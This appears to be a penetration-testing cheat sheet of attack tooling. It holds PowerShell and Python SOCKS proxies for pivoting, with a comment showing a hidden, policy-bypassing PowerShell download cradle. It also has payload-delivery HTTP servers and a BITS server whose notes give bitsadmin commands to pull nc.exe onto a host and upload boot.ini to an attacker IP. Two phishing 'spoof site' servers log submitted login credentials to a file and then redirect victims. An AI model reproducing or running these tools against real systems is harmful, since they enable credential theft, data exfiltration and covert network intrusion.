##### PS SOCKS
```ps1
# To invoke : Invoke-SocksProxy -bindIP 0.0.0.0 -bindPort 65535
# Serve it like: powershell -exec bypass -nop -noexit -windowstyle hidden -c (new-object system.net.webclient).downloadstring('...host your script.')
[ScriptBlock]$SocksConnectionMgr = {
    param($vars)
    $Script = {
            param($vars)
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }
    $rsp=$vars.rsp;
    function Get-IpAddress{
        param($ip)
        IF ($ip -as [ipaddress]){
            return $ip
        }else{
            $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        }
        return $ip2
    }
    $client=$vars.cliConnection
    $buffer = New-Object System.Byte[] 32
    try
    {
        $cliStream = $client.GetStream()
        $cliStream.Read($buffer,0,2) | Out-Null
        $socksVer=$buffer[0]
        if ($socksVer -eq 5){
            $cliStream.Read($buffer,2,$buffer[1]) | Out-Null
            for ($i=2; $i -le $buffer[1]+1; $i++) {
                if ($buffer[$i] -eq 0) {break}
            }
            if ($buffer[$i] -ne 0){
                $buffer[1]=255
                $cliStream.Write($buffer,0,2)
            }else{
                $buffer[1]=0
                $cliStream.Write($buffer,0,2)
            }
            $cliStream.Read($buffer,0,4) | Out-Null
            $cmd = $buffer[1]
            $atyp = $buffer[3]
            if($cmd -ne 1){
                $buffer[1] = 7
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            if($atyp -eq 1){
                $ipv4 = New-Object System.Byte[] 4
                $cliStream.Read($ipv4,0,4) | Out-Null
                $ipAddress = New-Object System.Net.IPAddress(,$ipv4)
                $hostName = $ipAddress.ToString()
            }elseif($atyp -eq 3){
                $cliStream.Read($buffer,4,1) | Out-Null
                $hostBuff = New-Object System.Byte[] $buffer[4]
                $cliStream.Read($hostBuff,0,$buffer[4]) | Out-Null
                $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff)
            }
            else{
                $buffer[1] = 8
                $cliStream.Write($buffer,0,2)
                throw "Not a valid destination address"
            }
            $cliStream.Read($buffer,4,2) | Out-Null
            $destPort = $buffer[4]*256 + $buffer[5]
            $destHost = Get-IpAddress($hostName)
            if($destHost -eq $null){
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant resolve destination address"
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
            if($tmpServ.Connected){
                $buffer[1]=0
                $buffer[3]=1
                $buffer[4]=0
                $buffer[5]=0
                $cliStream.Write($buffer,0,10)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();

            }
            else{
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant connect to host"
            }
       }elseif($socksVer -eq 4){
            $cmd = $buffer[1]
            if($cmd -ne 1){
                $buffer[0] = 0
                $buffer[1] = 91
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            $cliStream.Read($buffer,2,2) | Out-Null
            $destPort = $buffer[2]*256 + $buffer[3]
            $ipv4 = New-Object System.Byte[] 4
            $cliStream.Read($ipv4,0,4) | Out-Null
            $destHost = New-Object System.Net.IPAddress(,$ipv4)
            $buffer[0]=1
            while ($buffer[0] -ne 0){
                $cliStream.Read($buffer,0,1)
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)

            if($tmpServ.Connected){
                $buffer[0]=0
                $buffer[1]=90
                $buffer[2]=0
                $buffer[3]=0
                $cliStream.Write($buffer,0,8)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyTo($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();
            }
       }else{
            throw "Unknown socks version"
       }
    }
    catch {
        #$_ >> "error.log"
    }
    finally {
        if ($client -ne $null) {
            $client.Dispose()
        }
        if ($tmpServ -ne $null) {
            $tmpServ.Dispose()
        }
        Exit;
    }
}

function Invoke-SocksProxy {
    param (
            [String]$bindIP = "0.0.0.0",
            [Int]$bindPort = 1080,
            [Int]$threads = 200
     )
    try{
        $listener = new-object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Parse($bindIP), $bindPort)
        $listener.start()
        $rsp = [runspacefactory]::CreateRunspacePool(1,$threads);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        write-host "Listening on port $bindPort..."
        while($true){
            $client = $listener.AcceptTcpClient()
            Write-Host "New Connection from " $client.Client.RemoteEndPoint
            $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp}
            $PS3 = [PowerShell]::Create()
            $PS3.RunspacePool = $rsp;
            $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
            $PS3.BeginInvoke() | Out-Null
            Write-Host "Threads Left:" $rsp.GetAvailableRunspaces()
        }
     }
    catch{
        throw $_
    }
    finally{
        write-host "Server closed."
        if ($listener -ne $null) {
                  $listener.Stop()
           }
        if ($client -ne $null) {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

function Get-IpAddress{
    param($ip)
    IF ($ip -as [ipaddress]){
        return $ip
    }else{
        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        Write-Host "$ip resolved to $ip2"
    }
    return $ip2
}

function StartProxyServer {
    param (
        [String]$bindIP = "0.0.0.0",
        [Int]$bindPort = 1080
     )
    return Start-Job {
        param($bindIP,$bindPort)
        Invoke-SocksProxy -bindIP $bindIP -bindPort $bindPort;
    } -ArgumentList $bindIP, $bindPort;
}

# Invoke-SocksProxy -bindIP 0.0.0.0 -bindPort 65530;
# uncomment above to serve directly from http
```
##### PY SOCKS
```py
# from windows do: pyinstaller --onefile socks.py
# then upload and use..
#!/usr/bin/python
import logging
import select
import socket
import struct
from socketserver import ThreadingMixIn, TCPServer, StreamRequestHandler

logging.basicConfig(level=logging.DEBUG)
SOCKS_VERSION = 5
USER = 'usernamehere'
PASS = 'Securepasswordhere!!'

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    pass


class SocksProxy(StreamRequestHandler):
    username = USER
    password = PASS

    def handle(self):
        logging.info('Accepting connection from %s:%s' % self.client_address)
        header = self.connection.recv(2)
        version, nmethods = struct.unpack("!BB", header)

        assert version == SOCKS_VERSION
        assert nmethods > 0
        methods = self.get_available_methods(nmethods)

        if 2 not in set(methods):
            self.server.close_request(self.request)
            return

        self.connection.sendall(struct.pack("!BB", SOCKS_VERSION, 2))
        if not self.verify_credentials():
            return

        version, cmd, _, address_type = struct.unpack("!BBBB", self.connection.recv(4))
        assert version == SOCKS_VERSION

        if address_type == 1:
            address = socket.inet_ntoa(self.connection.recv(4))
        elif address_type == 3:
            domain_length = ord(self.connection.recv(1)[0])
            address = self.connection.recv(domain_length)

        port = struct.unpack('!H', self.connection.recv(2))[0]
        try:
            if cmd == 1:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.connect((address, port))
                bind_address = remote.getsockname()
                logging.info('Connected to %s %s' % (address, port))
            else:
                self.server.close_request(self.request)

            addr = struct.unpack("!I", socket.inet_aton(bind_address[0]))[0]
            port = bind_address[1]
            reply = struct.pack("!BBBBIH", SOCKS_VERSION, 0, 0, address_type,
                                addr, port)

        except Exception as err:
            logging.error(err)
            reply = self.generate_failed_reply(address_type, 5)

        self.connection.sendall(reply)
        if reply[1] == 0 and cmd == 1:
            self.exchange_loop(self.connection, remote)

        self.server.close_request(self.request)

    def get_available_methods(self, n):
        methods = []
        for i in range(n):
            methods.append(ord(self.connection.recv(1)))
        return methods

    def verify_credentials(self):
        version = ord(self.connection.recv(1))
        assert version == 1

        username_len = ord(self.connection.recv(1))
        username = self.connection.recv(username_len).decode('utf-8')

        password_len = ord(self.connection.recv(1))
        password = self.connection.recv(password_len).decode('utf-8')

        if username == self.username and password == self.password:
            response = struct.pack("!BB", version, 0)
            self.connection.sendall(response)
            return True

        response = struct.pack("!BB", version, 0xFF)
        self.connection.sendall(response)
        self.server.close_request(self.request)
        return False

    def generate_failed_reply(self, address_type, error_number):
        return struct.pack("!BBBBIH", SOCKS_VERSION, error_number, 0, address_type, 0, 0)

    def exchange_loop(self, client, remote):

        while True:
            r, w, e = select.select([client, remote], [], [])
            if client in r:
                data = client.recv(4096)
                if remote.send(data) <= 0:
                    break

            if remote in r:
                data = remote.recv(4096)
                if client.send(data) <= 0:
                    break

if __name__ == '__main__':
    with ThreadingTCPServer(('0.0.0.0', 65534), SocksProxy) as server:
        server.serve_forever()
```
##### PS HTTP
```ps1
Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Net.Sockets;
public class SimpleHTTPServer
{
    public HttpListener HttpListener { get; set; }
    public Task RequestHandler { get; set; }
    public bool RunServer { get; set; }
    public string IP { get; set; }
    public int Port { get; set; }
    public SimpleHTTPServer()
    {
        HttpListener = new HttpListener();
        RunServer = false;
        IP = Dns.GetHostEntry(Dns.GetHostName()).AddressList
            .FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)
            .ToString();
        Port = 80;
    }
    public SimpleHTTPServer(string IPAddress, int PortNumber)
    {
        HttpListener = new HttpListener();
        RunServer = false;
        IP = IPAddress;
        Port = PortNumber;
    }
    public void Start()
    {
        try
        {
            RunServer = true;
            HttpListener.Prefixes.Add(
                string.Format("http://{0}:{1}/", IP, Port)
            );
            HttpListener.Start();
            RequestHandler = HandleIncoming();
        }
        catch (Exception e)
        {
            RunServer = false;
            Console.WriteLine(e.Message);
        }
    }
    public void Stop()
    {
        try
        {
            RunServer = false;
            RequestHandler.GetAwaiter();
            HttpListener.Close();
        }
        catch (Exception e)
        {
            RunServer = false;
            Console.WriteLine(e.Message);
        }
    }
    public async Task HandleIncoming()
    {
        while (RunServer)
        {
            HttpListenerContext ctx = await HttpListener.GetContextAsync();
            HttpListenerRequest req = ctx.Request;
            HttpListenerResponse resp = ctx.Response;
            byte[] output = new byte[] { };
            try
            {
                string cwd = AppDomain.CurrentDomain.BaseDirectory;
                resp.StatusCode = 404;
                if (req.HttpMethod.Equals("GET"))
                {
                    if (req.Url.AbsolutePath.Equals("/"))
                    {
                        List<string> listing = new List<string>() {
                                @"<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 3.2 Final//EN"">",
                                @"<html>",
                                @"<title>Directory listing for /</title>",
                                @"<body>",
                                @"<h2>Directory listing for /</h2>",
                                @"<hr>",
                                @"<ul>"
                            };
                        foreach (var item in Directory.GetFiles(cwd))
                        {
                            listing.Add(string.Format(@"<li><a href=""{0}"">{0}</a>", item.Split('\\').Last()));
                        }
                        foreach (var item in Directory.GetDirectories(cwd))
                        {
                            listing.Add(string.Format(@"<li><a href=""{0}/"">{0}/</a>", item.Split('\\').Last()));
                        }
                        listing.AddRange(new List<string>() {
                                @"</ul>",
                                @"<hr>",
                                @"</body>",
                                @"</html>"
                            });
                        resp.StatusCode = 200;
                        resp.ContentType = "text/html";
                        output = Encoding.UTF8.GetBytes(string.Join("\n", listing));
                    }
                    else
                    {
                        string reqFile = string.Format("{0}/{1}", cwd, req.Url.AbsolutePath.Split('/').Last());
                        if (File.Exists(reqFile))
                        {
                            output = File.ReadAllBytes(reqFile);
                            resp.StatusCode = 200;
                            resp.ContentType = "binary/octet-stream";
                        }
                    }
                }
                resp.ContentEncoding = Encoding.UTF8;
                resp.ContentLength64 = output.LongLength;
                await resp.OutputStream.WriteAsync(output, 0, output.Length);
                resp.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
"@;

#$server = New-Object -TypeName SimpleHTTPServer -ArgumentList 127.0.0.1, 65535
#$server.Start();
```
##### PY HTTP
```py
#!/usr/bin/python
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests, SocketServer
from pwn import *
from sys import argv


context.log_level = 'info'


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        self.payload = server.payload
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        response = open(self.payload, 'rb').read()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        response = open(self.payload, 'rb').read()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


class Server(SocketServer.TCPServer):
    def __init__(self, payload, ip_address='0.0.0.0', port=80):
        self.payload = payload
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
        return self


if __name__ == '__main__':
    payload = argv[1]
    server = Server(payload=payload)
    server.start_limited()

```

#### BITS
```py
#!/usr/bin/env python
"""
A simple BITS server in python based on SimpleHTTPRequestHandler

* Supports both Download and Upload jobs (excluding Upload-Reply)
* Example client usage using PowerShell:
    > Import-Module BitsTransfer
    > Start-BitsTransfer -TransferType Upload -Source C:\temp\to_upload.txt -Destination http://127.0.0.1/to_upload.txt -DisplayName TEST

References: https://msdn.microsoft.com/en-us/library/windows/desktop/aa362828(v=vs.85).aspx
            https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MC-BUP/[MC-BUP].pdf

Author: Dor Azouri <dor.azouri@safebreach.com>

Date: 2017-03-29T12:14:45Z
bitsadmin /transfer pwning /download /priority normal http://192.168.243.128:9999/nc.exe c:\windows\temp\nc.exe

# NOTE: You need BITS on Kali to upload -- https://raw.githubusercontent.com/SafeBreach-Labs/SimpleBITSServer/master/SimpleBITSServer/SimpleBITSServer.py

bitsadmin /transfer pwning /upload /priority high http://192.168.243.128:9999/boot.ini c:\windows\boot.ini
"""
import os
from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler

# BITS Protocol header keys
K_BITS_SESSION_ID = 'BITS-Session-Id'
K_BITS_ERROR_CONTEXT = 'BITS-Error-Context'
K_BITS_ERROR_CODE = 'BITS-Error-Code'
K_BITS_PACKET_TYPE = 'BITS-Packet-Type'
K_BITS_SUPPORTED_PROTOCOLS = 'BITS-Supported-Protocols'
K_BITS_PROTOCOL = 'BITS-Protocol'

# HTTP Protocol header keys
K_ACCEPT_ENCODING = 'Accept-Encoding'
K_CONTENT_NAME = 'Content-Name'
K_CONTENT_LENGTH = 'Content-Length'
K_CONTENT_RANGE = 'Content-Range'
K_CONTENT_ENCODING = 'Content-Encoding'

# BITS Protocol header values
V_ACK = 'Ack'


# BITS server errors
class BITSServerHResult(object):
    # default context
    BG_ERROR_CONTEXT_REMOTE_FILE = hex(0x5)
    # official error codes
    BG_E_TOO_LARGE = hex(0x80200020)
    E_INVALIDARG = hex(0x80070057)
    E_ACCESSDENIED = hex(0x80070005)
    ZERO = hex(0x0)  # protocol specification does not give a name for this HRESULT
    # custom error code
    ERROR_CODE_GENERIC = hex(0x1)


class HTTPStatus(object):
    # Successful 2xx
    OK = 200
    CREATED = 201
    # Client Error 4xx
    BAD_REQUEST = 400
    FORBIDDEN = 403
    NOT_FOUND = 404
    CONFLICT = 409
    REQUESTED_RANGE_NOT_SATISFIABLE = 416
    # Server Error 5xx
    INTERNAL_SERVER_ERROR = 500
    NOT_IMPLEMENTED = 501


class BITSServerException(Exception):
    pass


class ClientProtocolNotSupported(BITSServerException):
    def __init__(self, supported_protocols):
        super(ClientProtocolNotSupported, self).__init__("Server supports neither of the requested protocol versions")
        self.requested_protocols = str(supported_protocols)


class ServerInternalError(BITSServerException):
    def __init__(self, internal_exception):
        super(ServerInternalError, self).__init__("Internal server error encountered")
        self.internal_exception = internal_exception


class InvalidFragment(BITSServerException):
    def __init__(self, last_range_end, new_range_start):
        super(ServerInternalError, self).__init__("Invalid fragment received on server")
        self.last_range_end = last_range_end
        self.new_range_start = new_range_start


class FragmentTooLarge(BITSServerException):
    def __init__(self, fragment_size):
        super(FragmentTooLarge, self).__init__("Oversized fragment received on server")
        self.fragment_size = fragment_size


class UploadAccessDenied(BITSServerException):
    def __init__(self):
        super(UploadAccessDenied, self).__init__("Write access to requested file upload is denied")


class BITSUploadSession(object):
    # holds the file paths that has an active upload session
    files_in_use = []

    def __init__(self, absolute_file_path, fragment_size_limit):
        self.fragment_size_limit = fragment_size_limit
        self.absolute_file_path = absolute_file_path
        self.fragments = []
        self.expected_file_length = -1

        # case the file already exists
        if os.path.exists(self.absolute_file_path):
            # case the file is actually a directory
            if os.path.isdir(self.absolute_file_path):
                self._status_code = HTTPStatus.FORBIDDEN
            # case the file is being uploaded in another active session
            elif self.absolute_file_path in BITSUploadSession.files_in_use:
                self._status_code = HTTPStatus.CONFLICT
            # case file exists on server - we overwrite the file with the new upload
            else:
                BITSUploadSession.files_in_use.append(self.absolute_file_path)
                self.__open_file()
        # case file does not exist but its parent folder does exist - we create the file
        elif os.path.exists(os.path.dirname(self.absolute_file_path)):
            BITSUploadSession.files_in_use.append(self.absolute_file_path)
            self.__open_file()
        # case file does not exist nor its parent folder - we don't create the directory tree
        else:
            self._status_code = HTTPStatus.FORBIDDEN

    def __open_file(self):
        try:
            self.file = open(self.absolute_file_path, "wb")
            self._status_code = HTTPStatus.OK
        except Exception:
            self._status_code = HTTPStatus.FORBIDDEN

    def __get_final_data_from_fragments(self):
        """
            Combines all accepted fragments' data into one string
        """
        return "".join([frg['data'] for frg in self.fragments])

    def get_last_status_code(self):
        return self._status_code

    def add_fragment(self, file_total_length, range_start, range_end, data):
        """
            Applies new fragment received from client to the upload session.
            Returns a boolean: is the new fragment last in session
        """
        # check if fragment size exceeds server limit
        if self.fragment_size_limit < range_end - range_start:
            raise FragmentTooLarge(range_end - range_start)

        # case new fragment is the first fragment in this session
        if self.expected_file_length == -1:
            self.expected_file_length = file_total_length

        last_range_end = self.fragments[-1]['range_end'] if self.fragments else -1
        if last_range_end + 1 < range_start:
            # case new fragment's range is not contiguous with the previous fragment
            # will cause the server to respond with status code 416
            raise InvalidFragment(last_range_end, range_start)
        elif last_range_end + 1 > range_start:
            # case new fragment partially overlaps last fragment
            # BITS protocol states that server should treat only the non-overlapping part
            range_start = last_range_end + 1

        self.fragments.append(
            {'range_start': range_start,
             'range_end': range_end,
             'data': data})

        # case new fragment is the first fragment in this session,
        # we write the final uploaded data to file
        if range_end + 1 == self.expected_file_length:
            self.file.write(self.__get_final_data_from_fragments())
            return True

        return False

    def close(self):
        self.file.flush()
        self.file.close()
        BITSUploadSession.files_in_use.remove(self.absolute_file_path)


class SimpleBITSRequestHandler(SimpleHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    base_dir = os.getcwd()
    supported_protocols = ["{7df0354d-249b-430f-820d-3d2a9bef4931}"]  # The only existing protocol version to date
    fragment_size_limit = 100 * 1024 * 1024  # bytes

    def __send_response(self, headers_dict={}, status_code=HTTPStatus.OK, data=""):
        """
            Sends server response w/ headers and status code
        """
        self.send_response(status_code)
        for k, v in headers_dict.iteritems():
            self.send_header(k, v)
        self.end_headers()

        self.wfile.write(data)

    def __release_resources(self):
        """
            Releases server resources for a session termination caused by either:
            Close-Session or Cancel-Session
        """
        headers = {
            K_BITS_PACKET_TYPE: V_ACK,
            K_CONTENT_LENGTH: '0'
        }

        try:
            session_id = self.headers.get(K_BITS_SESSION_ID, None).lower()
            headers[K_BITS_SESSION_ID] = session_id
            self.log_message("Closing BITS-Session-Id: %s", session_id)

            self.sessions[session_id].close()
            self.sessions.pop(session_id, None)

            status_code = HTTPStatus.OK
        except AttributeError:
            self.__send_response(headers, status_code=HTTPStatus.BAD_REQUEST)
            return
        except Exception as e:
            raise ServerInternalError(e)

        self.__send_response(headers, status_code=status_code)

    def _handle_fragment(self):
        """
            Handles a new Fragment packet from the client, adding it to the relevant upload session
        """
        headers = {
            K_BITS_PACKET_TYPE: V_ACK,
            K_CONTENT_LENGTH: '0'
        }

        try:
            # obtain client headers
            session_id = self.headers.get(K_BITS_SESSION_ID, None).lower()
            content_length = int(self.headers.get(K_CONTENT_LENGTH, None))
            content_name = self.headers.get(K_CONTENT_NAME, None)
            content_encoding = self.headers.get(K_CONTENT_ENCODING, None)
            content_range = self.headers.get(K_CONTENT_RANGE, None).split(" ")[-1]
            # set response headers's session id
            headers[K_BITS_SESSION_ID] = session_id
            # normalize fragment details
            crange, total_length = content_range.split("/")
            total_length = int(total_length)
            range_start, range_end = [int(num) for num in crange.split("-")]
        except AttributeError, IndexError:
            self.__send_response(status_code=HTTPStatus.BAD_REQUEST)
            return

        data = self.rfile.read(content_length)

        try:
            is_last_fragment = self.sessions[session_id].add_fragment(
                total_length, range_start, range_end, data)
            headers['BITS-Received-Content-Range'] = range_end + 1
        except InvalidFragment as e:
            headers[K_BITS_ERROR_CODE] = BITSServerHResult.ZERO
            headers[K_BITS_ERROR_CONTEXT] = BITSServerHResult.BG_ERROR_CONTEXT_REMOTE_FILE
            status_code = HTTPStatus.REQUESTED_RANGE_NOT_SATISFIABLE
            self.log_message("ERROR processing new fragment (BITS-Session-Id: %s)." + \
                             "New fragment range (%d) is not contiguous with last received (%d). context:%s, code:%s, exception:%s",
                             session_id,
                             e.new_range_start,
                             e.last_range_end,
                             headers[K_BITS_ERROR_CONTEXT],
                             headers[K_BITS_ERROR_CODE],
                             repr(e))
        except FragmentTooLarge as e:
            headers[K_BITS_ERROR_CODE] = BITSServerHResult.BG_E_TOO_LARGE
            headers[K_BITS_ERROR_CONTEXT] = BITSServerHResult.BG_ERROR_CONTEXT_REMOTE_FILE
            status_code = HTTPStatus.INTERNAL_SERVER_ERROR
            self.log_message("ERROR processing new fragment (BITS-Session-Id: %s)." + \
                             "New fragment size (%d) exceeds server limit (%d). context:%s, code:%s, exception:%s",
                             session_id,
                             e.fragment_size,
                             SimpleBITSRequestHandler.fragment_size_limit,
                             headers[K_BITS_ERROR_CONTEXT],
                             headers[K_BITS_ERROR_CODE],
                             repr(e))
        except Exception as e:
            raise ServerInternalError(e)

        status_code = HTTPStatus.OK
        self.__send_response(headers, status_code=status_code)

    def _handle_ping(self):
        """
            Handles Ping packet from client
        """
        self.log_message("%s RECEIVED", "PING")
        headers = {
            K_BITS_PACKET_TYPE: V_ACK,
            K_BITS_ERROR_CODE: '1',
            K_BITS_ERROR_CONTEXT: '',
            K_CONTENT_LENGTH: '0'
        }
        self.__send_response(headers, status_code=HTTPStatus.OK)

    def __get_current_session_id(self):
        return str(hash((self.connection.getpeername()[0], self.path)))

    def _handle_cancel_session(self):
        self.log_message("%s RECEIVED", "CANCEL-SESSION")
        return self.__release_resources()

    def _handle_close_session(self):
        self.log_message("%s RECEIVED", "CLOSE-SESSION")
        return self.__release_resources()

    def _handle_create_session(self):
        """
            Handles Create-Session packet from client. Creates the UploadSession.
            The unique ID that identifies a session in this server is a hash of the client's address and requested path.
        """
        self.log_message("%s RECEIVED", "CREATE-SESSION")

        headers = {
            K_BITS_PACKET_TYPE: V_ACK,
            K_CONTENT_LENGTH: '0'
        }

        if not getattr(self, "sessions", False):
            self.sessions = dict()
        try:
            # check if server's protocol version is supported in client
            client_supported_protocols = \
                self.headers.get(K_BITS_SUPPORTED_PROTOCOLS, None).lower().split(" ")
            protocols_intersection = set(client_supported_protocols).intersection(
                SimpleBITSRequestHandler.supported_protocols)

            # case mutual supported protocol is found
            if protocols_intersection:
                headers[K_BITS_PROTOCOL] = list(protocols_intersection)[0]
                requested_path = self.path[1:] if self.path.startswith("/") else self.path
                absolute_file_path = os.path.join(SimpleBITSRequestHandler.base_dir, requested_path)

                session_id = self.__get_current_session_id()
                self.log_message("Creating BITS-Session-Id: %s", session_id)
                if session_id not in self.sessions:
                    self.sessions[session_id] = BITSUploadSession(absolute_file_path,
                                                                  SimpleBITSRequestHandler.fragment_size_limit)

                headers[K_BITS_SESSION_ID] = session_id
                status_code = self.sessions[session_id].get_last_status_code()
                if status_code == HTTPStatus.FORBIDDEN:
                    raise UploadAccessDenied()
            # case no mutual supported protocol is found
            else:
                raise ClientProtocolNotSupported(client_supported_protocols)
        except AttributeError:
            self.__send_response(headers, status_code=HTTPStatus.BAD_REQUEST)
            return
        except ClientProtocolNotSupported as e:
            status_code = HTTPStatus.BAD_REQUEST
            headers[K_BITS_ERROR_CODE] = BITSServerHResult.E_INVALIDARG
            headers[K_BITS_ERROR_CONTEXT] = BITSServerHResult.BG_ERROR_CONTEXT_REMOTE_FILE
            self.log_message("ERROR creating new session - protocol mismatch (%s). context:%s, code:%s, exception:%s",
                             e.requested_protocols,
                             headers[K_BITS_ERROR_CONTEXT],
                             headers[K_BITS_ERROR_CODE],
                             repr(e))
        except UploadAccessDenied as e:
            headers[K_BITS_ERROR_CODE] = BITSServerHResult.E_ACCESSDENIED
            headers[K_BITS_ERROR_CONTEXT] = BITSServerHResult.BG_ERROR_CONTEXT_REMOTE_FILE
            self.log_message("ERROR creating new session - Access Denied. context:%s, code:%s, exception:%s",
                             headers[K_BITS_ERROR_CONTEXT],
                             headers[K_BITS_ERROR_CODE],
                             repr(e))
        except Exception as e:
            raise ServerInternalError(e)

        if status_code == HTTPStatus.OK or status_code == HTTPStatus.CREATED:
            headers[K_ACCEPT_ENCODING] = 'identity'

        self.__send_response(headers, status_code=status_code)

    def do_BITS_POST(self):
        headers = {}
        bits_packet_type = self.headers.getheaders(K_BITS_PACKET_TYPE)[0].lower()
        try:
            do_function = getattr(self, "_handle_%s" % bits_packet_type.replace("-", "_"))
            try:
                do_function()
                return
            except ServerInternalError as e:
                status_code = HTTPStatus.INTERNAL_SERVER_ERROR
                headers[K_BITS_ERROR_CODE] = BITSServerHResult.ERROR_CODE_GENERIC
        except AttributeError as e:
            # case an Unknown BITS-Packet-Type value was received by the server
            status_code = HTTPStatus.BAD_REQUEST
            headers[K_BITS_ERROR_CODE] = BITSServerHResult.E_INVALIDARG

        headers[K_BITS_ERROR_CONTEXT] = BITSServerHResult.BG_ERROR_CONTEXT_REMOTE_FILE
        self.log_message("Internal BITS Server Error. context:%s, code:%s, exception:%s",
                         headers[K_BITS_ERROR_CONTEXT],
                         headers[K_BITS_ERROR_CODE],
                         repr(e.internal_exception))
        self.__send_response(headers, status_code=status_code)


def run(server_class=HTTPServer, handler_class=SimpleBITSRequestHandler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print
    'Starting BITS server...'
    httpd.serve_forever()


if __name__ == "__main__":
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

#### SPOOF SITES
```py
#!/usr/bin/python
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests, SocketServer, ssl, os
from pwn import *
from sys import argv


context.log_level = 'info'


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        self.target = server.target
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        if self.path == '/' or self.path == '/index.html':
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
        else:
            if self.path.lower() == '/login':
              self.path = './index.html'
            else:
                self.path = '%s%s' % (os.getcwd(), self.path)
            response = open(self.path, 'rb').read()
            self.send_response(200)
            if '.ico' in self.path or '.png' in self.path:
                self.send_header("Content-type", "binary/octet-stream")
            else:
                self.send_header("Content-type", "text/html")
            self.send_header("Content-length", len(response))
            self.end_headers()
            self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        body = self.rfile.read(int(self.headers["Content-Length"]))
        open('https_posts.log', 'a').write(body)
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()


class HttpsServer(SocketServer.TCPServer):
    def __init__(self, target='', ip_address='0.0.0.0', port=443):
        self.target = target
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)
        self.socket = ssl.wrap_socket (self.socket, certfile='./server.pem', server_side=True)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
        return self


if __name__ == '__main__':
    server = HttpsServer(target="https://google.com/")
    server.start()
    # server.start_limited()

```
```py
#!/usr/bin/python
from SimpleHTTPServer import SimpleHTTPRequestHandler
import requests, SocketServer, os
from pwn import *
from sys import argv


context.log_level = 'info'



class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        self.target = server.target
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        if self.path == '/' or self.path == '/index.html':
            self.send_response(302)
            self.send_header("Location", "/login")
            self.end_headers()
        else:
            if self.path.lower() == '/login':
              self.path = './index.html'
            else:
                self.path = '%s%s' % (os.getcwd(), self.path)
            response = open(self.path, 'rb').read()
            self.send_response(200)
            if '.ico' in self.path or '.png' in self.path:
                self.send_header("Content-type", "binary/octet-stream")
            else:
                self.send_header("Content-type", "text/html")
            self.send_header("Content-length", len(response))
            self.end_headers()
            self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        body = self.rfile.read(int(self.headers["Content-Length"]))
        open('https_posts.log', 'a').write("%s\n" % body)
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()


class Server(SocketServer.TCPServer):
    def __init__(self, target='', ip_address='0.0.0.0', port=80):
        self.target = target
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
